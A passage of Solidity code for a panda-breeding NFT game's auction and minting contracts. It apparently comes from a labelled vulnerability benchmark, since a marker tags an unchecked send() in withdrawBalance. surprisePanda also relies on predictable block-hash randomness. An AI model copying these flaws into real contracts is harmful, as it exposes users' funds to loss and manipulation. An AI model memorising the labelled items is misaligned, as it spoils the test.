_tokenId, address _seller) internal {\n        _removeAuction(_tokenId);\n        _transfer(_seller, _tokenId);\n        AuctionCancelled(_tokenId);\n    }\n\n    /// @dev Computes the price and transfers winnings.\n    /// Does NOT transfer ownership of token.\n    function _bid(uint256 _tokenId, uint256 _bidAmount)\n        internal\n        returns (uint256)\n    {\n        // Get a reference to the auction struct\n        Auction storage auction = tokenIdToAuction[_tokenId];\n\n        // Explicitly check that this auction is currently live.\n        // (Because of how Ethereum mappings work, we can't just count\n        // on the lookup above failing. An invalid _tokenId will just\n        // return an auction object that is all zeros.)\n        require(_isOnAuction(auction));\n\n        // Check that the bid is greater than or equal to the current price\n        uint256 price = _currentPrice(auction);\n        require(_bidAmount >= price);\n\n        // Grab a reference to the seller before the auction struct\n        // gets deleted.\n        address seller = auction.seller;\n\n        // The bid is good! Remove the auction before sending the fees\n        // to the sender so we can't have a reentrancy attack.\n        _removeAuction(_tokenId);\n\n        // Transfer proceeds to seller (if there are any!)\n        if (price > 0) {\n            // Calculate the auctioneer's cut.\n            // (NOTE: _computeCut() is guaranteed to return a\n            // value <= price, so this subtraction can't go negative.)\n            uint256 auctioneerCut = _computeCut(price);\n            uint256 sellerProceeds = price - auctioneerCut;\n\n            // NOTE: Doing a transfer() in the middle of a complex\n            // method like this is generally discouraged because of\n            // reentrancy attacks and DoS attacks if the seller is\n            // a contract with an invalid fallback function. We explicitly\n            // guard against reentrancy attacks by removing the auction\n            // before calling transfer(), and the only thing the seller\n            // can DoS is the sale of their own asset! (And if it's an\n            // accident, they can call cancelAuction(). )\n            seller.transfer(sellerProceeds);\n        }\n\n        // Calculate any excess funds included with the bid. If the excess\n        // is anything worth worrying about, transfer it back to bidder.\n        // NOTE: We checked above that the bid amount is greater than or\n        // equal to the price so this cannot underflow.\n        uint256 bidExcess = _bidAmount - price;\n\n        // Return the funds. Similar to the previous transfer, this is\n        // not susceptible to a re-entry attack because the auction is\n        // removed before any transfers occur.\n        msg.sender.transfer(bidExcess);\n\n        // Tell the world!\n        AuctionSuccessful(_tokenId, price, msg.sender);\n\n        return price;\n    }\n\n\n\n    /// @dev Removes an auction from the list of open auctions.\n    /// @param _tokenId - ID of NFT on auction.\n    function _removeAuction(uint256 _tokenId) internal {\n        delete tokenIdToAuction[_tokenId];\n    }\n\n    /// @dev Returns true if the NFT is on auction.\n    /// @param _auction - Auction to check.\n    function _isOnAuction(Auction storage _auction) internal view returns (bool) {\n        return (_auction.startedAt > 0);\n    }\n\n    /// @dev Returns current price of an NFT on auction. Broken into two\n    ///  functions (this one, that computes the duration from the auction\n    ///  structure, and the other that does the price computation) so we\n    ///  can easily test that the price computation works correctly.\n    function _currentPrice(Auction storage _auction)\n        internal\n        view\n        returns (uint256)\n    {\n        uint256 secondsPassed = 0;\n\n        // A bit of insurance against negative values (or wraparound).\n        // Probably not necessary (since Ethereum guarnatees that the\n        // now variable doesn't ever go backwards).\n        if (now > _auction.startedAt) {\n            secondsPassed = now - _auction.startedAt;\n        }\n\n        return _computeCurrentPrice(\n            _auction.startingPrice,\n            _auction.endingPrice,\n            _auction.duration,\n            secondsPassed\n        );\n    }\n\n    /// @dev Computes the current price of an auction. Factored out\n    ///  from _currentPrice so we can run extensive unit tests.\n    ///  When testing, make this function public and turn on\n    ///  `Current price computation` test suite.\n    function _computeCurrentPrice(\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        uint256 _secondsPassed\n    )\n        internal\n        pure\n        returns (uint256)\n    {\n        // NOTE: We don't use SafeMath (or similar) in this function because\n        //  all of our public functions carefully cap the maximum values for\n        //  time (at 64-bits) and currency (at 128-bits). _duration is\n        //  also known to be non-zero (see the require() statement in\n        //  _addAuction())\n        if (_secondsPassed >= _duration) {\n            // We've reached the end of the dynamic pricing portion\n            // of the auction, just return the end price.\n            return _endingPrice;\n        } else {\n            // Starting price can be higher than ending price (and often is!), so\n            // this delta can be negative.\n            int256 totalPriceChange = int256(_endingPrice) - int256(_startingPrice);\n\n            // This multiplication can't overflow, _secondsPassed will easily fit within\n            // 64-bits, and totalPriceChange will easily fit within 128-bits, their product\n            // will always fit within 256-bits.\n            int256 currentPriceChange = totalPriceChange * int256(_secondsPassed) / int256(_duration);\n\n            // currentPriceChange can be negative, but if so, will have a magnitude\n            // less that _startingPrice. Thus, this result will always end up positive.\n            int256 currentPrice = int256(_startingPrice) + currentPriceChange;\n\n            return uint256(currentPrice);\n        }\n    }\n\n    /// @dev Computes owner's cut of a sale.\n    /// @param _price - Sale price of NFT.\n    function _computeCut(uint256 _price) internal view returns (uint256) {\n        // NOTE: We don't use SafeMath (or similar) in this function because\n        //  all of our entry functions carefully cap the maximum values for\n        //  currency (at 128-bits), and ownerCut <= 10000 (see the require()\n        //  statement in the ClockAuction constructor). The result of this\n        //  function is always guaranteed to be <= _price.\n        return _price * ownerCut / 10000;\n    }\n\n}\n\n\n\n\n/**\n * @title Pausable\n * @dev Base contract which allows children to implement an emergency stop mechanism.\n */\ncontract Pausable is Ownable {\n  event Pause();\n  event Unpause();\n\n  bool public paused = false;\n\n\n  /**\n   * @dev modifier to allow actions only when the contract IS paused\n   */\n  modifier whenNotPaused() {\n    require(!paused);\n    _;\n  }\n\n  /**\n   * @dev modifier to allow actions only when the contract IS NOT paused\n   */\n  modifier whenPaused {\n    require(paused);\n    _;\n  }\n\n  /**\n   * @dev called by the owner to pause, triggers stopped state\n   */\n  function pause() onlyOwner whenNotPaused returns (bool) {\n    paused = true;\n    Pause();\n    return true;\n  }\n\n  /**\n   * @dev called by the owner to unpause, returns to normal state\n   */\n  function unpause() onlyOwner whenPaused returns (bool) {\n    paused = false;\n    Unpause();\n    return true;\n  }\n}\n\n\n/// @title Clock auction for non-fungible tokens.\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract ClockAuction is Pausable, ClockAuctionBase {\n\n    /// @dev The ERC-165 interface signature for ERC-721.\n    ///  Ref: https://github.com/ethereum/EIPs/issues/165\n    ///  Ref: https://github.com/ethereum/EIPs/issues/721\n    bytes4 constant InterfaceSignature_ERC721 = bytes4(0x9a20483d);\n\n    /// @dev Constructor creates a reference to the NFT ownership contract\n    ///  and verifies the owner cut is in the valid range.\n    /// @param _nftAddress - address of a deployed contract implementing\n    ///  the Nonfungible Interface.\n    /// @param _cut - percent cut the owner takes on each auction, must be\n    ///  between 0-10,000.\n    function ClockAuction(address _nftAddress, uint256 _cut) public {\n        require(_cut <= 10000);\n        ownerCut = _cut;\n\n        ERC721 candidateContract = ERC721(_nftAddress);\n        require(candidateContract.supportsInterface(InterfaceSignature_ERC721));\n        nonFungibleContract = candidateContract;\n    }\n\n    /// @dev Remove all Ether from the contract, which is the owner's cuts\n    ///  as well as any Ether sent directly to the contract address.\n    ///  Always transfers to the NFT contract, but can be called either by\n    ///  the owner or the NFT contract.\n    function withdrawBalance() external {\n        address nftAddress = address(nonFungibleContract);\n\n        require(\n            msg.sender == owner ||\n            msg.sender == nftAddress\n        );\n        // We are using this boolean method to make sure that even if one fails it will still work\n        // <yes> <report> UNCHECKED_LL_CALLS\n        bool res = nftAddress.send(this.balance);\n    }\n\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of time to move between starting\n    ///  price and ending price (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function createAuction(\n        uint256 _tokenId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n        whenNotPaused\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(_owns(msg.sender, _tokenId));\n        _escrow(msg.sender, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            0\n        );\n        _addAuction(_tokenId, auction);\n    }\n\n    /// @dev Bids on an open auction, completing the auction and transferring\n    ///  ownership of the NFT if enough Ether is supplied.\n    /// @param _tokenId - ID of token to bid on.\n    function bid(uint256 _tokenId)\n        external\n        payable\n        whenNotPaused\n    {\n        // _bid will throw if the bid or funds transfer fails\n        _bid(_tokenId, msg.value);\n        _transfer(msg.sender, _tokenId);\n    }\n\n    /// @dev Cancels an auction that hasn't been won yet.\n    ///  Returns the NFT to original owner.\n    /// @notice This is a state-modifying function that can\n    ///  be called while the contract is paused.\n    /// @param _tokenId - ID of token on auction\n    function cancelAuction(uint256 _tokenId)\n        external\n    {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        address seller = auction.seller;\n        require(msg.sender == seller);\n        _cancelAuction(_tokenId, seller);\n    }\n\n    /// @dev Cancels an auction when the contract is paused.\n    ///  Only the owner may do this, and NFTs are returned to\n    ///  the seller. This should only be used in emergencies.\n    /// @param _tokenId - ID of the NFT on auction to cancel.\n    function cancelAuctionWhenPaused(uint256 _tokenId)\n        whenPaused\n        onlyOwner\n        external\n    {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        _cancelAuction(_tokenId, auction.seller);\n    }\n\n    /// @dev Returns auction info for an NFT on auction.\n    /// @param _tokenId - ID of NFT on auction.\n    function getAuction(uint256 _tokenId)\n        external\n        view\n        returns\n    (\n        address seller,\n        uint256 startingPrice,\n        uint256 endingPrice,\n        uint256 duration,\n        uint256 startedAt\n    ) {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        return (\n            auction.seller,\n            auction.startingPrice,\n            auction.endingPrice,\n            auction.duration,\n            auction.startedAt\n        );\n    }\n\n    /// @dev Returns the current price of an auction.\n    /// @param _tokenId - ID of the token price we are checking.\n    function getCurrentPrice(uint256 _tokenId)\n        external\n        view\n        returns (uint256)\n    {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        return _currentPrice(auction);\n    }\n\n}\n\n\n\n\n/// @title Reverse auction modified for siring\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SiringClockAuction is ClockAuction {\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSiringAuctionAddress() call.\n    bool public isSiringClockAuction = true;\n\n    // Delegate constructor\n    function SiringClockAuction(address _nftAddr, uint256 _cut) public\n        ClockAuction(_nftAddr, _cut) {}\n\n    /// @dev Creates and begins a new auction. Since this function is wrapped,\n    /// require sender to be PandaCore contract.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function createAuction(\n        uint256 _tokenId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(msg.sender == address(nonFungibleContract));\n        _escrow(_seller, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            0\n        );\n        _addAuction(_tokenId, auction);\n    }\n\n    /// @dev Places a bid for siring. Requires the sender\n    /// is the PandaCore contract because all bid methods\n    /// should be wrapped. Also returns the panda to the\n    /// seller rather than the winner.\n    function bid(uint256 _tokenId)\n        external\n        payable\n    {\n        require(msg.sender == address(nonFungibleContract));\n        address seller = tokenIdToAuction[_tokenId].seller;\n        // _bid checks that token ID is valid and will throw if bid fails\n        _bid(_tokenId, msg.value);\n        // We transfer the panda back to the seller, the winner will get\n        // the offspring\n        _transfer(seller, _tokenId);\n    }\n\n}\n\n\n\n\n/// @title Clock auction modified for sale of pandas\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SaleClockAuction is ClockAuction {\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSaleAuctionAddress() call.\n    bool public isSaleClockAuction = true;\n\n    // Tracks last 5 sale price of gen0 panda sales\n    uint256 public gen0SaleCount;\n    uint256[5] public lastGen0SalePrices;\n    uint256 public constant SurpriseValue = 10 finney;\n\n    uint256[] CommonPanda;\n    uint256[] RarePanda;\n    uint256   CommonPandaIndex;\n    uint256   RarePandaIndex;\n\n    // Delegate constructor\n    function SaleClockAuction(address _nftAddr, uint256 _cut) public\n        ClockAuction(_nftAddr, _cut) {\n            CommonPandaIndex = 1;\n            RarePandaIndex   = 1;\n    }\n\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function createAuction(\n        uint256 _tokenId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(msg.sender == address(nonFungibleContract));\n        _escrow(_seller, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            0\n        );\n        _addAuction(_tokenId, auction);\n    }\n\n    function createGen0Auction(\n        uint256 _tokenId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(msg.sender == address(nonFungibleContract));\n        _escrow(_seller, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            1\n        );\n        _addAuction(_tokenId, auction);\n    }    \n\n    /// @dev Updates lastSalePrice if seller is the nft contract\n    /// Otherwise, works the same as default bid method.\n    function bid(uint256 _tokenId)\n        external\n        payable\n    {\n        // _bid verifies token ID size\n        uint64 isGen0 = tokenIdToAuction[_tokenId].isGen0;\n        uint256 price = _bid(_tokenId, msg.value);\n        _transfer(msg.sender, _tokenId);\n\n        // If not a gen0 auction, exit\n        if (isGen0 == 1) {\n            // Track gen0 sale prices\n            lastGen0SalePrices[gen0SaleCount % 5] = price;\n            gen0SaleCount++;\n        }\n    }\n\n    function createPanda(uint256 _tokenId,uint256 _type)\n        external\n    {\n        require(msg.sender == address(nonFungibleContract));\n        if (_type == 0) {\n            CommonPanda.push(_tokenId);\n        }else {\n            RarePanda.push(_tokenId);\n        }\n    }\n\n    function surprisePanda()\n        external\n        payable\n    {\n        bytes32 bHash = keccak256(block.blockhash(block.number),block.blockhash(block.number-1));\n        uint256 PandaIndex;\n        if (bHash[25] > 0xC8) {\n            require(uint256(RarePanda.length) >= RarePandaIndex);\n            PandaIndex = RarePandaIndex;\n            RarePandaIndex ++;\n\n        } else{\n            require(uint256(CommonPanda.length) >= CommonPandaIndex);\n            PandaIndex = CommonPandaIndex;\n            CommonPandaIndex ++;\n        }\n        _transfer(msg.sender,PandaIndex);\n    }\n\n    function packageCount() external view returns(uint256 common,uint256 surprise) {\n        common   = CommonPanda.length + 1 - CommonPandaIndex;\n        surprise = RarePanda.length + 1 - RarePandaIndex;\n    }\n\n    function averageGen0SalePrice() external view returns (uint256) {\n        uint256 sum = 0;\n        for (uint256 i = 0; i < 5; i++) {\n            sum += lastGen0SalePrices[i];\n        }\n        return sum / 5;\n    }\n\n}\n\n\n\n/// @title Clock auction modified for sale of pandas\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SaleClockAuctionERC20 is ClockAuction {\n\n\n    event AuctionERC20Created(uint256 tokenId, uint256 startingPrice, uint256 endingPrice, uint256 duration, address erc20Contract);\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSaleAuctionAddress() call.\n    bool public isSaleClockAuctionERC20 = true;\n\n    mapping (uint256 => address) public tokenIdToErc20Address;\n\n    mapping (address => uint256) public erc20ContractsSwitcher;\n\n    mapping (address => uint256) public balances;\n    \n    // Delegate constructor\n    function SaleClockAuctionERC20(address _nftAddr, uint256 _cut) public\n        ClockAuction(_nftAddr, _cut) {}\n\n    function erc20ContractSwitch(address _erc20address, uint256 _onoff) external{\n        require (msg.sender == address(nonFungibleContract));\n\n        require (_erc20address != address(0));\n\n        erc20ContractsSwitcher[_erc20address] = _onoff;\n    }\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function createAuction(\n        uint256 _tokenId,\n        address _erc20Address,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration,\n        address _seller\n    )\n        external\n    {\n        // Sanity check that no inputs overflow how many bits we've allocated\n        // to store them in the auction struct.\n        require(_startingPrice == uint256(uint128(_startingPrice)));\n        require(_endingPrice == uint256(uint128(_endingPrice)));\n        require(_duration == uint256(uint64(_duration)));\n\n        require(msg.sender == address(nonFungibleContract));\n\n        require (erc20ContractsSwitcher[_erc20Address] > 0);\n        \n        _escrow(_seller, _tokenId);\n        Auction memory auction = Auction(\n            _seller,\n            uint128(_startingPrice),\n            uint128(_endingPrice),\n            uint64(_duration),\n            uint64(now),\n            0\n        );\n        _addAuctionERC20(_tokenId, auction, _erc20Address);\n        tokenIdToErc20Address[_tokenId] = _erc20Address;\n    }\n\n    /// @dev Adds an auction to the list of open auctions. Also fires the\n    ///  AuctionCreated event.\n    /// @param _tokenId The ID of the token to be put on auction.\n    /// @param _auction Auction to add.\n    function _addAuctionERC20(uint256 _tokenId, Auction _auction, address _erc20address) internal {\n        // Require that all auctions have a duration of\n        // at least one minute. (Keeps our math from getting hairy!)\n        require(_auction.duration >= 1 minutes);\n\n        tokenIdToAuction[_tokenId] = _auction;\n\n        AuctionERC20Created(\n            uint256(_tokenId),\n            uint256(_auction.startingPrice),\n            uint256(_auction.endingPrice),\n            uint256(_auction.duration),\n            _erc20address\n        );\n    }   \n\n    function bid(uint256 _tokenId)\n        external\n        payable{\n            // do nothing\n    }\n\n    /// @dev Updates lastSalePrice if seller is the nft contract\n    /// Otherwise, works the same as default bid method.\n    function bidERC20(uint256 _tokenId,uint256 _amount)\n        external\n    {\n        // _bid verifies token ID size\n        address seller = tokenIdToAuction[_tokenId].seller;\n        address _erc20address = tokenIdToErc20Address[_tokenId];\n        require (_erc20address != address(0));\n        uint256 price = _bidERC20(_erc20address,msg.sender,_tokenId, _amount);\n        _transfer(msg.sender, _tokenId);\n        delete tokenIdToErc20Address[_tokenId];\n    }\n\n    function cancelAuction(uint256 _tokenId)\n        external\n    {\n        Auction storage auction = tokenIdToAuction[_tokenId];\n        require(_isOnAuction(auction));\n        address seller = auction.seller;\n        require(msg.sender == seller);\n        _cancelAuction(_tokenId, seller);\n        delete tokenIdToErc20Address[_tokenId];\n    }\n\n    function withdrawERC20Balance(address _erc20Address, address _to) external returns(bool res)  {\n        require (balances[_erc20Address] > 0);\n        require(msg.sender == address(nonFungibleContract));\n        ERC20(_erc20Address).transfer(_to, balances[_erc20Address]);\n    }\n    \n    /// @dev Computes the price and transfers winnings.\n    /// Does NOT transfer ownership of token.\n    function _bidERC20(address _erc20Address,address _buyerAddress, uint256 _tokenId, uint256 _bidAmount)\n        internal\n        returns (uint256)\n    {\n        // Get a reference to the auction struct\n        Auction storage auction = tokenIdToAuction[_tokenId];\n\n        // Explicitly check that this auction is currently live.\n        // (Because of how Ethereum mappings work, we can't just count\n        // on the lookup above failing. An invalid _tokenId will just\n        // return an auction object that is all zeros.)\n        require(_isOnAuction(auction));\n\n\n        require (_erc20Address != address(0) && _erc20Address == tokenIdToErc20Address[_tokenId]);\n        \n\n        // Check that the bid is greater than or equal to the current price\n        uint256 price = _currentPrice(auction);\n        require(_bidAmount >= price);\n\n        // Grab a reference to the seller before the auction struct\n        // gets deleted.\n        address seller = auction.seller;\n\n        // The bid is good! Remove the auction before sending the fees\n        // to the sender so we can't have a reentrancy attack.\n        _removeAuction(_tokenId);\n\n        // Transfer proceeds to seller (if there are any!)\n        if (price > 0) {\n            // Calculate the auctioneer's cut.\n            // (NOTE: _computeCut() is guaranteed to return a\n            // value <= price, so this subtraction can't go negative.)\n            uint256 auctioneerCut = _computeCut(price);\n            uint256 sellerProceeds = price - auctioneerCut;\n\n            // Send Erc20 Token to seller should call Erc20 contract\n            // Reference to contract\n            require(ERC20(_erc20Address).transferFrom(_buyerAddress,seller,sellerProceeds));\n            if (auctioneerCut > 0){\n                require(ERC20(_erc20Address).transferFrom(_buyerAddress,address(this),auctioneerCut));\n                balances[_erc20Address] += auctioneerCut;\n            }\n        }\n\n        // Tell the world!\n        AuctionSuccessful(_tokenId, price, msg.sender);\n\n        return price;\n    }\n}\n\n\n/// @title Handles creating auctions for sale and siring of pandas.\n///  This wrapper of ReverseAuction exists only so that users can create\n///  auctions with only one transaction.\ncontract PandaAuction is PandaBreeding {\n\n    // @notice The auction contract variables are defined in PandaBase to allow\n    //  us to refer to them in PandaOwnership to prevent accidental transfers.\n    // `saleAuction` refers to the auction for gen0 and p2p sale of pandas.\n    // `siringAuction` refers to the auction for siring rights of pandas.\n\n    /// @dev Sets the reference to the sale auction.\n    /// @param _address - Address of sale contract.\n    function setSaleAuctionAddress(address _address) external onlyCEO {\n        SaleClockAuction candidateContract = SaleClockAuction(_address);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(candidateContract.isSaleClockAuction());\n\n        // Set the new contract address\n        saleAuction = candidateContract;\n    }\n\n    function setSaleAuctionERC20Address(address _address) external onlyCEO {\n        SaleClockAuctionERC20 candidateContract = SaleClockAuctionERC20(_address);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(candidateContract.isSaleClockAuctionERC20());\n\n        // Set the new contract address\n        saleAuctionERC20 = candidateContract;\n    }\n\n    /// @dev Sets the reference to the siring auction.\n    /// @param _address - Address of siring contract.\n    function setSiringAuctionAddress(address _address) external onlyCEO {\n        SiringClockAuction candidateContract = SiringClockAuction(_address);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(candidateContract.isSiringClockAuction());\n\n        // Set the new contract address\n        siringAuction = candidateContract;\n    }\n\n    /// @dev Put a panda up for auction.\n    ///  Does some ownership trickery to create auctions in one tx.\n    function createSaleAuction(\n        uint256 _pandaId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration\n    )\n        external\n        whenNotPaused\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_owns(msg.sender, _pandaId));\n        // Ensure the panda is not pregnant to prevent the auction\n        // contract accidentally receiving ownership of the child.\n        // NOTE: the panda IS allowed to be in a cooldown.\n        require(!isPregnant(_pandaId));\n        _approve(_pandaId, saleAuction);\n        // Sale auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        saleAuction.createAuction(\n            _pandaId,\n            _startingPrice,\n            _endingPrice,\n            _duration,\n            msg.sender\n        );\n    }\n\n    /// @dev Put a panda up for auction.\n    ///  Does some ownership trickery to create auctions in one tx.\n    function createSaleAuctionERC20(\n        uint256 _pandaId,\n        address _erc20address,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration\n    )\n        external\n        whenNotPaused\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_owns(msg.sender, _pandaId));\n        // Ensure the panda is not pregnant to prevent the auction\n        // contract accidentally receiving ownership of the child.\n        // NOTE: the panda IS allowed to be in a cooldown.\n        require(!isPregnant(_pandaId));\n        _approve(_pandaId, saleAuctionERC20);\n        // Sale auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        saleAuctionERC20.createAuction(\n            _pandaId,\n            _erc20address,\n            _startingPrice,\n            _endingPrice,\n            _duration,\n            msg.sender\n        );\n    }\n\n    function switchSaleAuctionERC20For(address _erc20address, uint256 _onoff) external onlyCOO{\n        saleAuctionERC20.erc20ContractSwitch(_erc20address,_onoff);\n    }\n\n\n    /// @dev Put a panda up for auction to be sire.\n    ///  Performs checks to ensure the panda can be sired, then\n    ///  delegates to reverse auction.\n    function createSiringAuction(\n        uint256 _pandaId,\n        uint256 _startingPrice,\n        uint256 _endingPrice,\n        uint256 _duration\n    )\n        external\n        whenNotPaused\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_owns(msg.sender, _pandaId));\n        require(isReadyToBreed(_pandaId));\n        _approve(_pandaId, siringAuction);\n        // Siring auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        siringAuction.createAuction(\n            _pandaId,\n            _startingPrice,\n            _endingPrice,\n            _duration,\n            msg.sender\n        );\n    }\n\n    /// @dev Completes a siring auction by bidding.\n    ///  Immediately breeds the winning matron with the sire on auction.\n    /// @param _sireId - ID of the sire on auction.\n    /// @param _matronId - ID of the matron owned by the bidder.\n    function bidOnSiringAuction(\n        uint256 _sireId,\n        uint256 _matronId\n    )\n        external\n        payable\n        whenNotPaused\n    {\n        // Auction contract checks input sizes\n        require(_owns(msg.sender, _matronId));\n        require(isReadyToBreed(_matronId));\n        require(_canBreedWithViaAuction(_matronId, _sireId));\n\n        // Define the current price of the auction.\n        uint256 currentPrice = siringAuction.getCurrentPrice(_sireId);\n        require(msg.value >= currentPrice + autoBirthFee);\n\n        // Siring auction will throw if the bid fails.\n        siringAuction.bid.value(msg.value - autoBirthFee)(_sireId);\n        _breedWith(uint32(_matronId), uint32(_sireId), msg.sender);\n    }\n\n    /// @dev Transfers the balance of the sale auction contract\n    /// to the PandaCore contract. We use two-step withdrawal to\n    /// prevent two transfer calls in the auction bid function.\n    function withdrawAuctionBalances() external onlyCLevel {\n        saleAuction.withdrawBalance();\n        siringAuction.withdrawBalance();\n    }\n\n\n    function withdrawERC20Balance(address _erc20Address, address _to) external onlyCLevel {\n        require(saleAuctionERC20 != address(0));\n        saleAuctionERC20.withdrawERC20Balance(_erc20Address,_to);\n    }    \n}\n\n\n\n\n\n/// @title all functions related to creating kittens\ncontract PandaMinting is PandaAuction {\n\n    // Limits the number of cats the contract owner can ever create.\n    //uint256 public constant PROMO_CREATION_LIMIT = 5000;\n    uint256 public constant GEN0_CREATION_LIMIT = 45000;\n\n\n    // Constants for gen0 auctions.\n    uint256 public constant GEN0_STARTING_PRICE = 100 finney;\n    uint256 public constant GEN0_AUCTION_DURATION = 1 days;\n    uint256 public constant OPEN_PACKAGE_PRICE = 10 finney;\n\n\n    // Counts the number of cats the contract owner has created.\n    //uint256 public promoCreatedCount;\n\n\n    /// @dev we can create promo kittens, up to a limit. Only callable by COO\n    /// @param _genes the encoded genes of the kitten to be created, any value is accepted\n    /// @param _owner the future owner of the created kittens. Default to contract COO\n    function createWizzPanda(uint256[2] _genes, uint256 _generation, address _owner) external onlyCOO {\n        address pandaOwner = _owner;\n        if (pandaOwner == address(0)) {\n            pandaOwner = cooAddress;\n        }\n\n        _createPanda(0, 0, _generation, _genes, pandaOwner);\n    }\n\n    /// @dev create pandaWithGenes\n    /// @param _genes panda genes\n    /// @param _type  0 common 1 rare\n    function createPanda(uint256[2] _genes,uint256 _generation,uint256 _type)\n        external\n        payable\n        onlyCOO\n        whenNotPaused\n    {\n        require(msg.value >= OPEN_PACKAGE_PRICE);\n        uint256 kittenId = _createPanda(0, 0, _generation, _genes, saleAuction);\n        saleAuction.createPanda(kittenId,_type);\n    }\n\n    //function buyPandaERC20(address _erc20Address, address _buyerAddress, uint256 _pandaID, uint256 _amount)\n    //external\n    //onlyCOO\n    //whenNotPaused {\n    //    saleAuctionERC20.bid(_erc20Address, _buyerAddress, _pandaID, _amount);\n    //}\n\n    /// @dev Creates a new gen0 panda with the given genes and\n    ///  creates an auction for it.\n    //function createGen0Auction(uint256[2] _genes) external onlyCOO {\n    //    require(gen0CreatedCount < GEN0_CREATION_LIMIT);\n    //\n    //    uint256 pandaId = _createPanda(0, 0, 0, _genes, address(this));\n    //    _approve(pandaId, saleAuction);\n    //\n    //    saleAuction.createAuction(\n    //        pandaId,\n    //        _computeNextGen0Price(),\n    //        0,\n    //        GEN0_AUCTION_DURATION,\n    //        address(this)\n    //    );\n    //\n    //    gen0CreatedCount++;\n    //}\n\n    